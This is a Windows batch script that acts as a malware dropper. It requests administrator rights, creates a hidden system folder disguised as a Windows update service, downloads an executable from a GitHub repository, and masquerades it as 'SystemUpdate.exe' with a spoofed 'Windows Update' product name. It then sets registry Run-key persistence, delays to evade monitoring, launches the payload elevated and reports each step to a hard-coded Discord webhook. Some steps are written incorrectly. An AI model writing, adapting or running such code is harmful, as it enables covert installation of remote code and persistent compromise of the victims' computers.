@echo off
:: Set Discord Webhook URL
set "https://discord.com/api/webhooks/1341351695627583528/6wPAgTWgNQAOWTXXxYa5iTOyYM8Ncns9R_olM7pbv774XJt23eZUdXuPd6ynhTyImt0F"

:: Function to send debug logs to Discord
set "logMessage="
setlocal enabledelayedexpansion
(
    echo $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    echo $message = "%logMessage%"
    echo Invoke-RestMethod -Uri "%webhookURL%" -Method Post -Headers @{"Content-Type"="application/json"} -Body (@{username="DebugLogger";content="$timestamp `n$message"} | ConvertTo-Json -Compress)
) > sendlog.ps1

:: Function to log messages
set "logMessage=Script started."
powershell -ExecutionPolicy Bypass -File sendlog.ps1

:: Check if already running
tasklist /FI "IMAGENAME eq SystemUpdate.exe" 2>NUL | find /I "SystemUpdate.exe" >NUL
if not errorlevel 1 (
    set "logMessage=Process already running. Exiting."
    powershell -ExecutionPolicy Bypass -File sendlog.ps1
    exit
)

:: Request admin permissions if not already elevated
net session >nul 2>&1
if %errorlevel% neq 0 (
    set "logMessage=Requesting admin privileges..."
    powershell -ExecutionPolicy Bypass -File sendlog.ps1
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs"
    exit
)

:: Set legitimate folder path
set "folderPath=%USERPROFILE%\AppData\Local\Microsoft\Windows\UpdateService"
mkdir "%folderPath%"

:: Make folder and file hidden and system files
attrib +H +S "%folderPath%" /S /D
set "logMessage=Created folder and set attributes."
powershell -ExecutionPolicy Bypass -File sendlog.ps1

:: Download executable from GitHub
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/Lulzalot%20Was%20Here.exe' -OutFile '%folderPath%\SystemUpdate.exe'"
set "logMessage=Downloaded executable from GitHub."
powershell -ExecutionPolicy Bypass -File sendlog.ps1

:: Spoof file properties to look like a legitimate Windows process
powershell -Command "(Get-Item '%folderPath%\SystemUpdate.exe').VersionInfo | Set-ItemProperty -Name 'ProductName' -Value 'Windows Update'"
set "logMessage=Spoofed file properties."
powershell -ExecutionPolicy Bypass -File sendlog.ps1

:: Add to startup for persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateService" /t REG_SZ /d "%folderPath%\SystemUpdate.exe" /f
set "logMessage=Added to startup."
powershell -ExecutionPolicy Bypass -File sendlog.ps1

:: Delay execution to avoid detection by real-time monitoring
timeout /t 30 /nobreak >nul
set "logMessage=Delayed execution for stealth."
powershell -ExecutionPolicy Bypass -File sendlog.ps1

:: Run the downloaded executable with elevated privileges
powershell -Command "Start-Process '%folderPath%\SystemUpdate.exe' -Verb runAs"
set "logMessage=Executed downloaded file."
powershell -ExecutionPolicy Bypass -File sendlog.ps1

:: Clear command history to remove traces
doskey /history >nul
set "logMessage=Cleared command history."
powershell -ExecutionPolicy Bypass -File sendlog.ps1

:: Cleanup temporary files
del sendlog.ps1
set "logMessage=Cleaned up temp files. Script completed."
powershell -ExecutionPolicy Bypass -File sendlog.ps1

:: Exit the script
exit
